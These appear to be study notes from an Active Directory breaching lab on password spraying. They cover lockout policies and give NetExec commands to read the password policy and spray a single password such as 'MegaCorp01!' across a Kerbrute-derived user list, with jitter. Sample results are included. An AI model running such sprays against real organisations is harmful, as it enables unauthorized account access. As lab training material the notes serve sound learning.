# 🔐 Username Enumeration and Password Spraying

> **Topic:** Introduction to AD Breaching
>
> **Section:** Username Enumeration and Password Spraying

---

# 📖 Overview

At this stage, we should have:

- A validated username list from username enumeration
- Potential intelligence from credential discovery
- Possible default passwords
- Password patterns
- Or even a complete credential pair

If valid credentials have not yet been obtained, password spraying can be used.

---

# 🔄 Password Spraying vs Brute-Forcing

Understanding the difference is important because authentication attempts can trigger account lockout policies.

## Brute-Forcing

Targets:

```text
One Account
     ↓
Many Passwords
```

This can trigger account lockouts.

---

## Password Spraying

Targets:

```text
One Password
     ↓
Many Accounts
```

The attacker limits authentication attempts against each individual account.

---

# 🔑 Why Password Spraying Can Work

Even organisations with password-complexity requirements can have predictable passwords.

Examples mentioned in the source include:

```text
Summer2025!
MegaCorp01!
```

Other predictable patterns may come from:

- Company names
- Seasons
- Years
- Default onboarding passwords

---

# 🔒 Understanding Lockout Policies

Before spraying, determine the target domain's lockout policy whenever possible.

Example:

```text
Account Lockout Threshold: 5
Reset Account Lockout Counter: 30 minutes
Locked Account Duration: 30 minutes
```

If five failed attempts trigger a lockout, aggressively spraying multiple passwords can lock out accounts.

---

# ✅ Safer Spraying Approach

The source recommends:

1. Spray one password at a time across the entire user list.
2. Wait for the lockout observation window before attempting the next password.

If the policy is unknown:

> Assume a conservative threshold and use only one password at a time with a generous delay.

---

# 🔍 Querying the Password Policy with NetExec

If valid credentials are already available:

```bash
nxc smb 192.168.12.100 -u 'validuser' -p 'validpassword' --pass-pol
```

---

# 📊 Example Policy

The lab example returns:

```text
Minimum password length: 8
Password history length: 12
Account Lockout Threshold: 5
Reset Account Lockout Counter: 30
Locked Account Duration: 30
Password Complexity: ENABLED
Minimum Password Age: 1
Maximum Password Age: 42
```

With a threshold of five attempts, the source notes that up to four passwords can be sprayed within a 30-minute window without triggering the threshold.

---

# 🧹 Clean Kerbrute Output

The source uses:

```bash
grep "VALID USERNAME" valid_users.txt | awk '{print $NF}' | sed 's/@thm.loc//' > clean_users.txt
```

This produces a cleaner username list for the spraying stage.

---

# 💥 Password Spraying with NetExec

```bash
nxc smb 192.168.12.100 -u clean_users.txt -p 'MegaCorp01!' --continue-on-success
```

---

# 🔍 Command Breakdown

```text
smb
```

Protocol used for authentication.

```text
192.168.12.100
```

Target Domain Controller.

```text
-u clean_users.txt
```

Username list.

```text
-p 'MegaCorp01!'
```

Single password to spray against all usernames.

```text
--continue-on-success
```

Continue testing usernames even after a successful login.

---

# 📄 Example Results

```text
[-] thm.loc\jane.smith:MegaCorp01! STATUS_LOGON_FAILURE
[-] thm.loc\bob.taylor:MegaCorp01! STATUS_LOGON_FAILURE
[+] thm.loc\alice.moore:MegaCorp01!
[-] thm.loc\charlie.davis:MegaCorp01! STATUS_LOGON_FAILURE
[-] thm.loc\eve.wilson:MegaCorp01! STATUS_ACCOUNT_DISABLED
```

---

# 📊 Interpreting Results

| Result | Meaning |
|---|---|
| `[+]` | Successful authentication |
| `STATUS_LOGON_FAILURE` | Incorrect password |
| `STATUS_ACCOUNT_DISABLED` | Account exists but is disabled |
| `STATUS_ACCOUNT_LOCKED_OUT` | Account is locked |
| `Pwn3d!` | Successful login with local administrator privileges on the target |

---

# ⚠️ Account Lockout Warning

If:

```text
STATUS_ACCOUNT_LOCKED_OUT
```

appears:

> **Stop spraying immediately.**

Review the lockout policy and adjust the approach.

---

# ⏱️ Jitter

NetExec can introduce random delays between authentication attempts.

Example:

```bash
nxc smb 192.168.12.100 -u clean_users.txt -p 'MegaCorp01!' --continue-on-success --jitter 2-5
```

---

# 🌐 Other Spray Targets

Password spraying can also target:

- Outlook Web Access (OWA)
- RDP
- VPN portals
- LDAP
- WinRM
- MSSQL

NetExec supports many of these protocols.

---

# 💡 Key Takeaways

- Password spraying is different from brute-forcing.
- Brute force targets one account with many passwords.
- Password spraying targets many accounts with one password.
- Lockout policies must be understood before spraying.
- NetExec can query password policy and perform authentication testing.
- `--continue-on-success` allows the spray to continue after a successful login.
- `--jitter` introduces random delays.
- `STATUS_ACCOUNT_LOCKED_OUT` should immediately stop a spray.
- Other AD-integrated services can also be password-spraying targets.
